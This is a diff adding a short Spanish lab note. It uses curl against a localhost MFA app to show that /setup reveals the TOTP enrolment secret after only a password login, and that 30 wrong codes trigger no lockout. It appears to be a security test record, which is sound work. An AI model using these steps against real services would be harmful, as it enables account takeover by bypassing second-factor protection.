@@ -1,0 +1,8 @@
+## Falla A: /setup con SOLO la contraseña (factor 1)
+$ curl -c cj -d "username=estudiante&password=****" http://127.0.0.1:5001/
+302 -> http://127.0.0.1:5001/verify
+$ curl -b cj http://127.0.0.1:5001/setup | grep -o "otpauth://totp/[^?]*?secret=" (secreto redactado)
+otpauth://totp/FGRLabs%20MFA:estudiante?secret=[REDACTADO]
+
+## Falla B: 30 códigos erróneos seguidos, ¿algún bloqueo (429)?
+401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 
